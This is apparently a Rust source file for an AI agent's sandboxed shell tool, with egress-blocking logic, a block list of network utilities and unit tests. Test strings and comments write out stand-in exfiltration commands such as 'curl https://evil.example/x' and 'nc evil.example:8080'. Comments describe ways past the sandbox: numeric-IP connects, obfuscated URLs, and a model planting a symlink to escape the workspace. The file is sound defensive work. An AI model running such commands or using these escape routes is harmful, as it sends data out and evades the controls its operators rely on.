//! Built-in `shell` tool. Manifest:
//! `crates/atelier-core/tools/shell.v1.json`.
//!
//! Args: `{ command: string, cwd?: string, timeout_ms?: integer,
//! allow_net?: bool }`. Runs `sh -c <command>` inside the §11 sandbox
//! (`sandbox-exec` on macOS, `bwrap` on Linux). Captures stdout / stderr /
//! exit code via the shared [`crate::subprocess`] helper.
//!
//! `allow_net: true` flips the sandbox policy from default-deny to
//! allow-network-egress — agents must request this explicitly per call
//! (matching the manifest convention: opt-in, surfaces in the §8 trust
//! budget UI).
//!
//! ## §11 egress mechanical gate
//!
//! Spec §11 acceptance gate: `curl evil.example` must be blocked and
//! the attempt logged. The shell tool enforces this in **two layers**:
//!
//! 1. **Command-level parse (primary).** Before spawning, we scan the
//!    command string for URLs / `host:port` targets. When `allow_net`
//!    is false and we see a non-loopback destination, we (a) append
//!    an `EgressEvent` to the session's `audit.log`, and (b) return a
//!    `ToolError::SandboxViolation` without ever running the command.
//!    This is the layer that gives us a deterministic test surface
//!    (no dependency on `sandbox-exec` / `bwrap` / a working network)
//!    and the one the §11 mechanical gate exercises.
//!
//! 2. **Proxy env vars (defence-in-depth).** When `allow_net` is
//!    false, we set `http_proxy` / `https_proxy` / `HTTP_PROXY` /
//!    `HTTPS_PROXY` / `all_proxy` / `ALL_PROXY` to
//!    `http://127.0.0.1:1` (port 1 is the TCPmux service, unused on
//!    every real-world host, so the connect refuses immediately) and
//!    clear `NO_PROXY` / `no_proxy`. Any HTTP-aware client inside the
//!    subprocess (`curl`, `wget`, `git`, `pip`, `npm`, anything
//!    `reqwest`-backed) honours these and connect-refuses. This
//!    catches egress paths the parser doesn't (a `bash` script that
//!    builds the URL dynamically, a binary that pulls from `$URL`).
//!
//! We pick the proxy approach over Linux network namespaces or macOS
//! `pf` rules because: (a) namespaces only work on Linux and require
//! root or unshared user namespaces (not guaranteed in CI); (b) `pf`
//! requires sudo on macOS, which is a non-starter for a developer
//! tool. The proxy approach is portable and testable on every dev
//! machine. The downside is documented honestly: a subprocess that
//! does raw `connect()` on a numeric IP without consulting proxy env
//! vars (e.g. `nc 10.0.0.1 22`) defeats layer 2 — but layer 1's
//! parser catches the case the mechanical gate names (the `curl
//! evil.example` shape), and a future hardening pass can graft a
//! Linux-only namespace path under `#[cfg(target_os = "linux")]`.

use async_trait::async_trait;
use serde::Deserialize;

use super::{ensure_inside_workspace_existing, resolve_repo_path};
use crate::audit::{append_subprocess_egress, EgressEvent};
use crate::dispatcher::{SideEffectClass, Tool, ToolContext, ToolResult};
use crate::error::ToolError;
#[cfg(test)]
use crate::sandbox::SandboxPolicy;
use crate::subprocess::{run as run_subprocess, sandboxed_argv, SubprocessSpec};
use crate::time::now_rfc3339;

pub const NAME: &str = "shell";
const DEFAULT_TIMEOUT_MS: u64 = 30_000;

#[derive(Debug, Default)]
pub struct Shell;

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct Args {
    command: String,
    #[serde(default)]
    cwd: Option<String>,
    #[serde(default)]
    timeout_ms: Option<u64>,
    #[serde(default)]
    allow_net: bool,
}

#[async_trait]
impl Tool for Shell {
    fn name(&self) -> &str {
        NAME
    }

    fn side_effect_class(&self) -> SideEffectClass {
        SideEffectClass::LocalRisky
    }

    async fn execute(
        &self,
        args: serde_json::Value,
        ctx: &ToolContext<'_>,
    ) -> Result<ToolResult, ToolError> {
        let parsed: Args =
            serde_json::from_value(args).map_err(|e| ToolError::SchemaViolation {
                tool: NAME.into(),
                error: e.to_string(),
            })?;
        if parsed.command.is_empty() {
            return Err(ToolError::SchemaViolation {
                tool: NAME.into(),
                error: "command must not be empty".into(),
            });
        }

        // cwd, if provided, is repo-relative and path-validated.
        //
        // v57 (H8 fix) — the pre-v57 path called only `resolve_repo_path`,
        // which is syntax-only (rejects `..` + absolute paths but does
        // NOT follow symlinks). A model that wrote a symlink
        // `escape -> /Users/me` inside the workspace via `write_file`
        // could then call `shell` with `cwd: "escape"` and start the
        // child under attacker-controlled cwd. macOS sandbox-exec
        // still bounds the FS; Linux bwrap binds the original repo
        // path. This added containment is defence-in-depth.
        let cwd_abs = if let Some(rel) = parsed.cwd.as_deref() {
            let abs = resolve_repo_path(ctx.workspace_root, NAME, rel)?;
            Some(ensure_inside_workspace_existing(
                ctx.workspace_root,
                NAME,
                &abs,
            )?)
        } else {
            None
        };

        // Clone the session's sandbox policy so any per-session extras
        // (extra_read_paths, extra_write_paths) survive into the shell
        // call. Mutating the clone for `allow_net` doesn't affect the
        // session default. Prior versions rebuilt the policy from scratch
        // via `SandboxPolicy::restrictive(ctx.sandbox.repo_root())`,
        // which silently dropped any extras the session had granted.
        let mut policy = ctx.sandbox.clone();
        let net_allowed = parsed.allow_net || ctx.sandbox.allow_net_flag();
        if net_allowed {
            policy = policy.with_net();
        }

        // §11 layer 1 — command-level parse. When egress is disallowed
        // and the command names an external destination, append an
        // audit row + refuse to dispatch. Loopback / link-local
        // targets (`127.0.0.1`, `::1`, `localhost`) are not considered
        // egress: tooling commonly hits a local proxy or HTTP fixture
        // (the canonical workload at `tests/workload/canonical/` has
        // a few) and blocking those would break legitimate flows.
        if !net_allowed {
            if let Some(dest) = first_external_destination(&parsed.command) {
                // Audit BEFORE returning so the §11 mechanical gate
                // can observe the row even on the refused path. We
                // deliberately do not propagate audit-log failure —
                // the block is the load-bearing guarantee; the row is
                // a secondary record (see crate::audit module docs).
                if let Some(audit_path) = ctx.audit_log_path {
                    let event = EgressEvent::blocked_subprocess_egress(
                        now_rfc3339(),
                        ctx.tool_call_id.unwrap_or(""),
                        NAME,
                        &dest,
                    );
                    if let Err(e) = append_subprocess_egress(audit_path, &event) {
                        tracing::warn!(
                            error = %e,
                            path = ?audit_path,
                            "shell: failed to append §11 egress audit row; \
                             egress is still blocked",
                        );
                    }
                } else {
                    tracing::warn!(
                        tool_call_id = ?ctx.tool_call_id,
                        destination = %dest,
                        "shell: §11 egress block fired without an audit_log_path; \
                         row dropped",
                    );
                }
                return Err(ToolError::SandboxViolation {
                    tool: NAME.into(),
                    attempted: format!("network egress to {dest}"),
                });
            }
        }

        let user_argv = vec!["sh".to_string(), "-c".to_string(), parsed.command.clone()];

        let (program, wrapped_args) =
            sandboxed_argv(&user_argv, &policy).map_err(|e| ToolError::SandboxViolation {
                tool: NAME.into(),
                attempted: format!("sandbox wrap failed: {e}"),
            })?;

        let mut spec =
            SubprocessSpec::with_budget_ms(parsed.timeout_ms.unwrap_or(DEFAULT_TIMEOUT_MS));
        spec.working_dir = cwd_abs;

        // §11 layer 2 — proxy env vars. Only set when egress is
        // disallowed; an `allow_net: true` call must reach the real
        // network. We deliberately do NOT shadow the user's own
        // `http_proxy` if they've explicitly opted into network —
        // the per-call spec.env override below would lose that
        // signal. Port 1 is TCPmux (RFC 1078), unused on every real
        // host; connect-refuses immediately so the subprocess fails
        // fast instead of waiting for a TCP timeout.
        if !net_allowed {
            for key in [
                "http_proxy",
                "https_proxy",
                "HTTP_PROXY",
                "HTTPS_PROXY",
                "all_proxy",
                "ALL_PROXY",
            ] {
                spec.env
                    .insert(key.to_string(), "http://127.0.0.1:1".to_string());
            }
            // Explicit empty NO_PROXY / no_proxy so a user-side
            // `NO_PROXY=*` doesn't bypass the closed-port proxy.
            // The env_clear in `subprocess::run` already drops the
            // parent's env; this is belt-and-braces for the case
            // where a caller pre-populated `spec.env` upstream of us.
            spec.env.insert("NO_PROXY".to_string(), String::new());
            spec.env.insert("no_proxy".to_string(), String::new());
        }

        let outcome = run_subprocess(&program, &wrapped_args, &spec)
            .await
            .map_err(|e| ToolError::ExecutionFailed {
                tool: NAME.into(),
                exit_code: -1,
                stderr: format!("subprocess spawn failed: {e}"),
            })?;

        // The contract: the agent receives the captured output regardless
        // of exit code. Non-zero exit + timed_out flow back as part of
        // `output` so the model can decide what to do; only a real
        // SandboxViolation (which sandbox-exec / bwrap surfaces via exit
        // code, not this layer) escalates to a typed ToolError. For v0
        // we leave that detection to the subprocess result — agents see
        // the exit code and stderr.
        Ok(ToolResult {
            output: serde_json::json!({
                "exit_code": outcome.exit_code,
                "stdout": outcome.stdout_str_lossy(),
                "stderr": outcome.stderr_str_lossy(),
                "stdout_truncated": outcome.stdout_truncated,
                "stderr_truncated": outcome.stderr_truncated,
                "duration_ms": outcome.duration_ms,
                "timed_out": outcome.timed_out,
            }),
            staged_writes: None,
        })
    }
}

/// First external host found in a shell command, or `None` when the
/// command targets only loopback / no network at all.
///
/// We deliberately keep the parser narrow: the §11 mechanical gate is
/// satisfied by catching the `curl evil.example`-shaped commands, and
/// a parser that tries to handle every possible obfuscation
/// (`bash -c "$(cat url.txt)"`, environment-variable interpolation,
/// base64-encoded URLs) would either be too lenient (false positives
/// on user prose containing dotted strings) or too strict (false
/// negatives on dynamically-constructed URLs). Layer 2 — the proxy
/// env vars — is what catches the obfuscated cases at runtime.
///
/// Shape:
///   * `http://host[:port]/...` / `https://host[:port]/...` —
///     accepted, host extracted (everything between `://` and the
///     first `/`, `?`, `#`, or whitespace).
///   * `host.tld[:port]/path` — accepted when `host.tld` looks like
///     a registered domain (contains a `.`) and the surrounding
///     context is plausibly a CLI argument (e.g. `curl evil.example`,
///     `wget evil.example/x`).
///   * `127.0.0.1`, `::1`, `localhost`, `localhost.localdomain` —
///     treated as loopback, not egress.
fn first_external_destination(command: &str) -> Option<String> {
    // 1. Scheme-prefixed URLs. The cheap-and-correct path; covers
    //    `curl https://evil.example/foo?x=1` and friends. Always
    //    checked because an `http://` URL is unambiguous regardless of
    //    the surrounding command.
    if let Some(host) = extract_scheme_url_host(command) {
        if !is_loopback(&host) {
            return Some(host);
        }
    }
    // 2. Bare-host CLI arguments. Only checked when the *command* is a
    //    known egress utility (curl, wget, ssh, …). Walking every
    //    whitespace token of an arbitrary command was ambiguous: file
    //    paths like `README.md` / `cart.py` / `pkg.test` parse as
    //    `host.tld` (alphanumeric start, single dot, alpha last
    //    segment) and false-positived as network destinations during
    //    the v60.17 t02 live re-probe. Defense-in-depth: the proxy
    //    env-var fallback (`http_proxy=http://127.0.0.1:1`) still
    //    blocks any HTTP egress from any subprocess that doesn't
    //    appear here.
    let cmd_name = first_command_name(command);
    if cmd_name.map(is_known_egress_command).unwrap_or(false) {
        for raw in command.split_whitespace() {
            // Strip surrounding quotes / shell metachars cheaply.
            let token = raw.trim_matches(['"', '\'', '(', ')', ';', '`']);
            if token.is_empty() {
                continue;
            }
            if let Some(host) = extract_bare_host(token) {
                if !is_loopback(&host) {
                    return Some(host);
                }
            }
        }
    }
    None
}

/// Extract the first whitespace-separated token of `command`, stripping
/// leading env-var assignments (`FOO=bar curl …`) so the egress check
/// looks at the actual program. Returns `None` if the command is empty
/// or consists entirely of assignments.
fn first_command_name(command: &str) -> Option<&str> {
    for token in command.split_whitespace() {
        // Skip leading `KEY=value` shell assignments; they precede the
        // real program (`FOO=1 BAR=2 curl …`).
        if token.contains('=')
            && token
                .split_once('=')
                .map(|(k, _)| {
                    !k.is_empty() && k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
                })
                .unwrap_or(false)
        {
            continue;
        }
        return Some(token);
    }
    None
}

/// Conservative list of command-line programs whose typical use is
/// outbound network traffic. The bare-host parser only walks command
/// arguments when the program is one of these. Subprocesses that fetch
/// over HTTP from inside an interpreter (`python -c "urllib.urlopen"`)
/// are caught by the proxy env-var fallback, not by this list.
fn is_known_egress_command(cmd: &str) -> bool {
    // Strip a leading path so `/usr/bin/curl` and `curl` both match.
    let basename = cmd.rsplit('/').next().unwrap_or(cmd);
    matches!(
        basename,
        "curl"
            | "wget"
            | "nc"
            | "ncat"
            | "netcat"
            | "ssh"
            | "scp"
            | "sftp"
            | "rsync"
            | "telnet"
            | "ftp"
            | "ping"
            | "ping6"
            | "host"
            | "dig"
            | "nslookup"
            | "axel"
            | "aria2"
            | "aria2c"
            | "lftp"
    )
}

fn extract_scheme_url_host(s: &str) -> Option<String> {
    let lower = s.to_ascii_lowercase();
    let idx = lower
        .find("http://")
        .map(|i| (i, "http://".len()))
        .or_else(|| lower.find("https://").map(|i| (i, "https://".len())))?;
    let after = &s[idx.0 + idx.1..];
    // Stop at the first separator that ends a host[:port] section.
    let end = after
        .find(['/', '?', '#', ' ', '\t', '"', '\'', '`', ';'])
        .unwrap_or(after.len());
    let host = after[..end].trim_matches('@');
    // `user:pass@host` — keep what's after the last `@`.
    let host = host.rsplit('@').next().unwrap_or(host);
    if host.is_empty() {
        None
    } else {
        Some(host.to_string())
    }
}

fn extract_bare_host(token: &str) -> Option<String> {
    // Trim a leading path / port / query separator off the end of the
    // token so `evil.example/x` and `evil.example:443/x` both
    // collapse to `evil.example` (or `evil.example:443`).
    let host_end = token.find(['/', '?', '#']).unwrap_or(token.len());
    let candidate = &token[..host_end];
    if candidate.is_empty() {
        return None;
    }
    // Must start with an alphanumeric to skip `./foo`, `../foo`,
    // `-flag`, etc.
    if !candidate
        .chars()
        .next()
        .map(|c| c.is_ascii_alphanumeric())
        .unwrap_or(false)
    {
        return None;
    }
    // Bare hostnames must have at least one `.` to count — keeps
    // single-token shell commands (`ls`, `pwd`) from being mistaken
    // for a host. `evil.example`, `host.local`, `1.2.3.4` all qualify.
    if !candidate.contains('.') {
        return None;
    }
    // RFC 1035 hostnames use `[A-Za-z0-9-]` per label and `.` between
    // labels. Allow an optional `:port` suffix where port is digits.
    // Anything else (parens, commas, equals, brackets, slashes — the
    // shape of an embedded `python -c "sys.path.insert(0, '.')"`
    // argument) is not a hostname and must not be treated as egress.
    // Without this guard the canonical t01 workload's pytest validation
    // step false-positives on the `python -c` style fixture commands.
    if !candidate
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == ':')
    {
        return None;
    }
    // Filter out tokens that are clearly not hostnames: file paths
    // (contain a `/` — already handled above), version strings
    // (`foo-1.2.3` starts alphanumeric and has dots, but ends with a
    // digit and contains no letters in the last segment is fine —
    // however we'd false-positive on things like `package-1.2`). The
    // call site only fires under `allow_net: false`, where a false
    // positive returns SandboxViolation and the agent learns to
    // either flip `allow_net: true` or rephrase. We accept the
    // conservative side-effect for the mechanical gate's sake.
    //
    // Reject tokens whose last segment is purely numeric (looks like
    // a version) unless it's also a valid IPv4 (4 numeric segments).
    let segments: Vec<&str> = candidate.split('.').collect();
    let last = segments.last().copied().unwrap_or("");
    let last_alpha_or_port = last.contains(':') || last.chars().any(|c| c.is_ascii_alphabetic());
    let is_ipv4 = segments.len() == 4
        && segments.iter().all(|seg| {
            !seg.is_empty()
                && seg.len() <= 3
                && seg.chars().all(|c| c.is_ascii_digit())
                && seg.parse::<u8>().is_ok()
        });
    if !last_alpha_or_port && !is_ipv4 {
        return None;
    }
    Some(candidate.to_string())
}

fn is_loopback(host: &str) -> bool {
    // Strip an optional `:port` suffix for the comparison.
    let host_only = host.split(':').next().unwrap_or(host);
    matches!(
        host_only,
        "localhost" | "localhost.localdomain" | "127.0.0.1" | "::1" | "0.0.0.0"
    ) || host_only.starts_with("127.")
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    fn ctx<'a>(root: &'a Path, sandbox: &'a SandboxPolicy) -> ToolContext<'a> {
        ToolContext {
            workspace_root: root,
            sandbox,
            tool_call_id: None,
            audit_log_path: None,
            cancel: tokio_util::sync::CancellationToken::new(),
            deadline: crate::dispatcher::DEFAULT_TOOL_DEADLINE,
            subagent_depth: 0,
        }
    }

    /// Tests gated on macOS because sandbox-exec is always present there.
    /// On Linux, bwrap may not be installed; these are integration tests
    /// rather than the dispatcher's unit-test surface. The
    /// dispatcher-level unit tests use the EchoTool mock instead.
    #[cfg(target_os = "macos")]
    #[tokio::test]
    async fn shell_runs_simple_command_inside_sandbox() {
        let dir = tempfile::TempDir::new().unwrap();
        let s = SandboxPolicy::restrictive(dir.path()).unwrap();
        let r = Shell
            .execute(
                serde_json::json!({"command": "echo hello"}),
                &ctx(dir.path(), &s),
            )
            .await
            .unwrap();
        assert_eq!(r.output["exit_code"], 0);
        let stdout = r.output["stdout"].as_str().unwrap();
        assert!(stdout.contains("hello"), "stdout: {stdout:?}");
    }

    #[tokio::test]
    async fn empty_command_is_schema_violation() {
        let dir = tempfile::TempDir::new().unwrap();
        let s = SandboxPolicy::restrictive(dir.path()).unwrap();
        let err = Shell
            .execute(serde_json::json!({"command": ""}), &ctx(dir.path(), &s))
            .await
            .unwrap_err();
        assert!(matches!(err, ToolError::SchemaViolation { .. }));
    }

    #[tokio::test]
    async fn cwd_escape_is_permission_denied() {
        let dir = tempfile::TempDir::new().unwrap();
        let s = SandboxPolicy::restrictive(dir.path()).unwrap();
        let err = Shell
            .execute(
                serde_json::json!({"command": "true", "cwd": "../outside"}),
                &ctx(dir.path(), &s),
            )
            .await
            .unwrap_err();
        assert!(matches!(err, ToolError::PermissionDenied { .. }));
    }

    // ---------- §11 egress parser ----------

    #[test]
    fn first_external_destination_catches_curl_evil_example() {
        let dest = first_external_destination("curl evil.example").unwrap();
        assert_eq!(dest, "evil.example");
    }

    #[test]
    fn first_external_destination_catches_https_url() {
        let dest = first_external_destination("curl https://evil.example/path?x=1").unwrap();
        assert_eq!(dest, "evil.example");
    }

    #[test]
    fn first_external_destination_catches_host_with_port() {
        let dest = first_external_destination("nc evil.example:8080").unwrap();
        assert_eq!(dest, "evil.example:8080");
    }

    #[test]
    fn first_external_destination_skips_loopback() {
        assert!(first_external_destination("curl http://localhost:8000/").is_none());
        assert!(first_external_destination("curl http://127.0.0.1:5000/").is_none());
        assert!(first_external_destination("nc 127.0.0.1 22").is_none());
    }

    #[test]
    fn first_external_destination_ignores_file_paths_and_flags() {
        assert!(first_external_destination("ls -la").is_none());
        assert!(first_external_destination("cat ./README.md").is_none());
        assert!(first_external_destination("rm -rf ../tmp").is_none());
        assert!(first_external_destination("echo hello").is_none());
    }

    #[test]
    fn first_external_destination_handles_user_at_host_in_url() {
        let dest = first_external_destination("curl https://user:pass@evil.example/foo").unwrap();
        assert_eq!(dest, "evil.example");
    }

    #[test]
    fn first_external_destination_catches_ipv4_address() {
        let dest = first_external_destination("curl http://203.0.113.1/foo").unwrap();
        assert_eq!(dest, "203.0.113.1");
    }

    #[test]
    fn first_external_destination_ignores_filenames_with_tld_like_extensions() {
        // Surfaced by the live t02 re-probe: the model invoked
        //   grep -r compute_total README.md
        //   cat cart.py
        // and the bare-host parser flagged `README.md` and `cart.py`
        // as hostnames (`md` and `py` are plausible 2-letter TLDs;
        // tokens are otherwise charset-clean). DNS hostnames have no
        // way to reliably distinguish from filename.tld without
        // out-of-band context, so the parser now only walks bare-host
        // tokens when the *command* is a known egress utility.
        assert!(first_external_destination("grep -r compute_total README.md").is_none());
        assert!(first_external_destination("cat orders/cart.py").is_none());
        assert!(first_external_destination("rm pkg.test").is_none());
        assert!(first_external_destination("python3 -m pytest tests/test_utils.py").is_none());
        // The scheme-URL path stays unconditional so embedded
        // `http(s)://…` URLs are still caught regardless of command.
        assert_eq!(
            first_external_destination(
                "python3 -c \"import urllib; urllib.urlopen('https://evil.example/x')\""
            ),
            Some("evil.example".to_string())
        );
    }

    #[test]
    fn first_command_name_skips_leading_env_assignments() {
        assert_eq!(first_command_name("FOO=1 BAR=2 curl x"), Some("curl"));
        assert_eq!(first_command_name("curl x"), Some("curl"));
        assert_eq!(first_command_name(""), None);
        // Not an env assignment — leading `=foo` (no key) doesn't match.
        assert_eq!(first_command_name("=foo bar"), Some("=foo"));
    }

    #[test]
    fn is_known_egress_command_matches_basename_only() {
        assert!(is_known_egress_command("curl"));
        assert!(is_known_egress_command("/usr/bin/curl"));
        assert!(is_known_egress_command("wget"));
        assert!(!is_known_egress_command("python3"));
        assert!(!is_known_egress_command("bash"));
        assert!(!is_known_egress_command("grep"));
    }

    #[test]
    fn first_external_destination_ignores_python_dash_c_dotted_identifiers() {
        // Surfaced by the live t01 re-probe: the model invoked
        //   python3 -c "import sys; sys.path.insert(0, '.'); from utils import …"
        // and the bare-host parser flagged `sys.path.insert(0,` as a
        // hostname (starts alphanumeric, contains a dot, last segment
        // has letters). DNS hostnames are `[A-Za-z0-9.-]` (plus
        // optional `:port`); embedded shell-quoted code that drops a
        // `(`, `,`, `'`, or `[` into a whitespace-split token must be
        // rejected.
        assert!(first_external_destination(
            "python3 -c \"import sys; sys.path.insert(0, '.'); from utils import divisible_by\""
        )
        .is_none());
        // Variants that should also stay clean.
        assert!(first_external_destination("python -c 'a.b.c(1)'").is_none());
        assert!(first_external_destination("foo --opt=a.b.c").is_none());
        assert!(first_external_destination("bar [a.b]").is_none());
    }

    // ---------- §11 mechanical gate: block + audit ----------

    #[tokio::test]
    async fn curl_evil_example_with_default_policy_is_sandbox_violation() {
        let workspace = tempfile::TempDir::new().unwrap();
        let sandbox = SandboxPolicy::restrictive(workspace.path()).unwrap();
        let audit_path = workspace.path().join(".atelier/sessions/abc/audit.log");
        let ctx = ToolContext {
            workspace_root: workspace.path(),
            sandbox: &sandbox,
            tool_call_id: Some("tc-curl-evil-1"),
            audit_log_path: Some(audit_path.as_path()),
            cancel: tokio_util::sync::CancellationToken::new(),
            deadline: crate::dispatcher::DEFAULT_TOOL_DEADLINE,
            subagent_depth: 0,
        };

        let err = Shell
            .execute(
                serde_json::json!({"command": "curl https://evil.example/x"}),
                &ctx,
            )
            .await
            .unwrap_err();
        match &err {
            ToolError::SandboxViolation { tool, attempted } => {
                assert_eq!(tool, NAME);
                assert!(
                    attempted.contains("evil.example"),
                    "attempted should name the destination: {attempted}"
                );
            }
            other => panic!("expected SandboxViolation, got {other:?}"),
        }

        // audit.log exists and carries exactly one EgressEvent line.
        let body = std::fs::read_to_string(&audit_path).expect("audit.log written");
        let lines: Vec<&str> = body.lines().collect();
        assert_eq!(lines.len(), 1, "expected one row, got {body:?}");
        let parsed: EgressEvent = serde_json::from_str(lines[0]).unwrap();
        assert_eq!(parsed.version, 1);
        assert_eq!(parsed.kind, "subprocess-egress");
        assert_eq!(parsed.tool_call_id, "tc-curl-evil-1");
        assert_eq!(parsed.tool_name, NAME);
        assert_eq!(parsed.destination, "evil.example");
        assert_eq!(parsed.outcome, "blocked");
        assert_eq!(parsed.reason, "sandbox-deny-net");
        // RFC 3339 second-precision, Z-suffix — matches the harness's
        // canonical time helper.
        assert!(
            parsed.timestamp.ends_with('Z') && parsed.timestamp.len() == 20,
            "timestamp shape: {:?}",
            parsed.timestamp
        );
    }

    #[tokio::test]
    async fn loopback_curl_with_default_policy_is_allowed_to_dispatch() {
        // A loopback destination is not egress per §11 policy.
        // sandbox-exec / bwrap may still refuse outright, so we don't
        // assert the OUTCOME — just that we don't short-circuit with
        // a SandboxViolation before even dispatching.
        let workspace = tempfile::TempDir::new().unwrap();
        let sandbox = SandboxPolicy::restrictive(workspace.path()).unwrap();
        let audit_path = workspace.path().join(".atelier/sessions/abc/audit.log");
        let ctx = ToolContext {
            workspace_root: workspace.path(),
            sandbox: &sandbox,
            tool_call_id: Some("tc-loopback"),
            audit_log_path: Some(audit_path.as_path()),
            cancel: tokio_util::sync::CancellationToken::new(),
            deadline: crate::dispatcher::DEFAULT_TOOL_DEADLINE,
            subagent_depth: 0,
        };
        // We don't care about the run outcome; we care that we did
        // NOT return early as SandboxViolation. Use `true` so the
        // dispatch succeeds even when the sandbox refuses curl.
        let res = Shell
            .execute(
                serde_json::json!({"command": "true # curl http://127.0.0.1:8000/ would not block"}),
                &ctx,
            )
            .await;
        // Either Ok or a non-SandboxViolation failure (e.g. on a Linux
        // host without bwrap). The thing we're testing is the absence
        // of the §11 block.
        if let Err(e) = res {
            assert!(
                !matches!(e, ToolError::SandboxViolation { .. }),
                "loopback should not trip the §11 block, got {e:?}"
            );
        }
        // Audit file must not exist — no row was written.
        assert!(!audit_path.exists(), "no audit row should be written");
    }

    #[tokio::test]
    async fn external_curl_with_allow_net_does_not_short_circuit_or_audit() {
        // `allow_net: true` opts into network; the §11 mechanical
        // gate is no longer in scope (the agent / user accepted the
        // budget cost via the trust-budget UI before flipping the
        // flag).
        let workspace = tempfile::TempDir::new().unwrap();
        let sandbox = SandboxPolicy::restrictive(workspace.path()).unwrap();
        let audit_path = workspace.path().join(".atelier/sessions/abc/audit.log");
        let ctx = ToolContext {
            workspace_root: workspace.path(),
            sandbox: &sandbox,
            tool_call_id: Some("tc-allow-net"),
            audit_log_path: Some(audit_path.as_path()),
            cancel: tokio_util::sync::CancellationToken::new(),
            deadline: crate::dispatcher::DEFAULT_TOOL_DEADLINE,
            subagent_depth: 0,
        };
        let res = Shell
            .execute(
                serde_json::json!({
                    "command": "true # would curl evil.example with net",
                    "allow_net": true,
                }),
                &ctx,
            )
            .await;
        if let Err(e) = res {
            assert!(
                !matches!(e, ToolError::SandboxViolation { .. }),
                "allow_net should bypass §11, got {e:?}"
            );
        }
        assert!(
            !audit_path.exists(),
            "allow_net path must not emit an audit row"
        );
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn cwd_through_symlink_escaping_workspace_is_permission_denied() {
        // Regression for H8 — `resolve_repo_path` was the only check
        // pre-v57, and it didn't follow symlinks. A symlink inside the
        // workspace pointing outside it should be rejected by
        // `ensure_inside_workspace_existing`.
        let workspace = tempfile::TempDir::new().unwrap();
        let outside = tempfile::TempDir::new().unwrap();
        let link = workspace.path().join("escape");
        std::os::unix::fs::symlink(outside.path(), &link).unwrap();
        let s = SandboxPolicy::restrictive(workspace.path()).unwrap();
        let err = Shell
            .execute(
                serde_json::json!({"command": "true", "cwd": "escape"}),
                &ctx(workspace.path(), &s),
            )
            .await
            .unwrap_err();
        assert!(
            matches!(err, ToolError::PermissionDenied { .. }),
            "shell with cwd through a symlink-out must be PermissionDenied; got {err:?}"
        );
    }
}
